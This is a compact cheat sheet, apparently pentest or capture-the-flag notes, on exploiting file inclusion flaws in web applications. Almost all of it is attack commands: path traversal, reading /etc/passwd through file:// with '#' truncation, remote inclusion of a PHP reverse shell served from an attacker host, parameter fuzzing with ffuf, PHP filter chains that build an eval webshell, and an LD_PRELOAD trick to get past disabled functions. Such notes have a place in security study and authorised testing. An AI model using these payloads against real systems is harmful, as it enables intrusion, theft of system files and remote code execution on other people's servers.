# File Inclusion (LFI/RFI)

LFI via a "theme/template/skin"-style parameter — traverse to read source instead of rendering it:

```bash
view-source:http://<TARGET>/<page>?<param>=../<target-file-no-ext>
```

`file://` scheme on any "fetch by URL" param — try it even when the param looks URL-only. If the backend appends a suffix/extension, truncate it with a URL-encoded `#`:

```bash
<param>=file:///etc/passwd
<param>=file:///etc/passwd%23          # %23 = '#', drops anything the server appends after it
```

RFI — if the include/fetch isn't restricted to local paths, point it at attacker-hosted code. Some includes evaluate fetched PHP even without `<?php ?>` tags if the sink does `eval`/`include` on raw fetched content:

```bash
python -m http.server <LPORT>     # serve your payload (e.g. pentestmonkey php-reverse-shell)
GET /<endpoint>?<param>=http://<LHOST>:<LPORT>/shell.php
```

Fuzz for the parameter/payload shape when you don't already know it:
```bash
ffuf -w <LFI-wordlist, e.g. SecLists LFI-Jhaddix.txt> -u "http://<TARGET>/?<param>=FUZZ" -fl <baseline-linecount>
```

LFI-to-RCE with no write permission, via PHP filter chains (no upload needed — the `path` itself IS the payload):
```bash
python3 php_filter_chain_generator.py --chain '<?=eval($_POST["x"])?>' | grep '^php'
# use the generated php://filter/... string as the LFI path parameter directly
```
If `disabled_functions` blocks `exec`/`system`/`shell_exec`/etc., check whether `putenv()` and `mail()` are still enabled — a Chankro-style `LD_PRELOAD` trick via a fake sendmail binary can still get code execution.
